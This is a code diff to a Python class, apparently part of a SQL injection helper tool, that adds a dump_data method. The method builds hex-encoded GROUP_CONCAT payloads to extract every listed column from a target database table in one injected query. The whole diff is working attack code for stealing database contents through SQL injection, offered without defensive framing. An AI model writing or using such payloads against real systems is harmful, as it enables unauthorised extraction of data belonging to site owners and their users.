@@ -6,9 +6,27 @@ class Dios:
         
     startSQLi = "0x3C73716C692D68656C7065723E" # <sqli-helper>
     endSQLi = "0x3C2F73716C692D68656C7065723E" # </sqli-helper>
+    endData = "0x3c656e642f3e" # <end/>
 
     def build(self, query):
         return f"(select+concat({self.startSQLi},(select+concat({query})),{self.endSQLi}))"
+    
+    def dump_data(self, tables, columns, database, level=1):
+        response_query=''
+        if level == 1:
+            column_query=''
+
+            for column in columns:
+                query = "0x" + self.strTohex(f"<{column}>");
+                query += f",{column},"
+                query += "0x" + self.strTohex(f"</{column}>");
+                column_query += query + ","
+
+            # print(self.strTohex("<end/>"))
+            column_query = column_query.strip(",")
+            # end_data = "0x" + self.strTohex("<end/>")
+            response_query = f"(SELECT+GROUP_CONCAT({column_query},{self.endData})+FROM+{database}.{tables})"
+        return response_query
 
     def get_information(self,level=1):
         if level == 1:
